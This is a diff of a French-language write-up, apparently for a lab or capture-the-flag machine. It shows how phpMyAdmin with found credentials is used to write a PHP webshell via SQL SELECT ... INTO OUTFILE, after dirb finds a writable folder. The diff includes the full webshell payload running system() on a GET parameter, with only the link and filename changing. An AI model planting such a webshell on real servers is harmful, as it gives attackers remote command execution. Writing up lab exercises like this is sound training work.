@@ -82,7 +82,7 @@ On apprend dans les mails reçus que l'on peut accéder à la database avec les 
 ## PhpMyAdmin Webshell exploit
 
 On peut effectivement se connecter à phpMyAdmin (https://192.168.56.#/phpmyadmin) avec les identifiants découverts.
-Après quelques recherches, cette version de phpMyAdmin est vulnérable à un [exploit Webshell](https://www.netspi.com/blog/technical/network-penetration-testing/linux-hacking-case-studies-part-3-phpmyadmin/). Pour pouvoir exploiter cette vulnérabilité, il va falloir trouver un dossier où l'on peut écrire.
+Après quelques recherches, cette version de phpMyAdmin est vulnérable à une [injection de code php dans le SQL](https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/). Pour pouvoir exploiter cette vulnérabilité, il va falloir trouver un dossier où l'on peut écrire.
 
 - `dirb https://192.168.56.101/forum ~/Applications/dirb222/wordlists/common.txt -rN 403`
   ```shell
@@ -103,7 +103,7 @@ Après quelques recherches, cette version de phpMyAdmin est vulnérable à un [e
 
 - On va tester ces dossiers pour notre exploit depuis l'onglet SQL de phpMyAdmin:
   ```sql
-    SELECT '<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM><?php if ($_GET["cmd"]) {system($_GET["cmd"]);} ?>' into outfile '/var/www/forum/templates_c/webshell.php'
+    SELECT '<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM><pre><?php if ($_GET["cmd"]) {system($_GET["cmd"]);} ?></pre>' into outfile '/var/www/forum/templates_c/f.php'
   ```
   - Le premier a fonctionner est le dossier forum/templates_c, on obtient donc un moyen de lancer des commandes via PhPMyAdmin à l'adresse "https://192.168.56.#/forum/templates_c/webshell.php" grâce à la fonction [system](https://www.php.net/manual/en/function.system.php) de php!
 
